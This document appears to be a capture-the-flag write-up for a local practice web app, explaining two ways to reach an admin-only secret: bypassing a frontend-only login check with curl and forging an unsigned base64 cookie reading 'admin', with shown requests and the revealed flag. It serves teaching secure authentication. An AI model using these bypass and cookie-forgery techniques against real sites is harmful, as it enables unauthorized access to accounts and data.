## flow 
- on login page we give username,password(for simplicity anyone can login with any username,password combination except as admin)
- the code stops making backend request when user name is `admin`
- if the user name is not admin ,the code sends a post request
- it will get a cookie and store it in locastorage
- then we are redircted to profile page
- in profile page user is given a choice to fetch `the secret`
- the secret is visible `per the code` only to the admin user
- the code implements(tries to implement it as follows)
- it takes the previously stored cookie from localstorage
- it send back the cookie
- the backend reads the cookie and `based on cookie  value` it greets user
## solution
- there are multiple ways to get the secret
### way1
- when we try to login ,the code stops us from loggin in as admin
- the check as can be seen only on frontend part
- so we can use tools like curl,burpsuit to bypass this 
### takeaway
- we need to implement critical security restricion not just on fronend but also on backend side
### way2
- while fetchign the secret we see it works on basis of cookie
- it is not a jwt token,the validity is never verified
- which means user can easily manipulate it to admin
- so just changing the cookie value when gettng secret gives the answer
### takeaways
- always while checking user authenticy based on user provided value we need to check whether the saying itself is right or not
- we need to verify the authenticity of the said ones
- so we need to implement someting like a signature 
```
C:\home\radha> curl 'http://localhost:4001/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: http://localhost:4001/login' -H 'Content-Type: application/json' -H 'Origin: http://localhost:4001' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"name":"admin","password":"m,lm"}'
{"login status":"lgoin success","cookie":"YWRtaW4="}                                                                                                                                                                      
C:\home\radha> curl 'http://localhost:4001/secret' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: http://localhost:4001/profile' -H 'Content-Type: application/json' -H 'Origin: http://localhost:4001' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"cookie":"YWRtaW4="}'
{"secret":"hiadmincongrats! here is the key secret_key_of_b64_decode_congrats\n"}                                                                                                                                                                      
C:\home\radha> 
```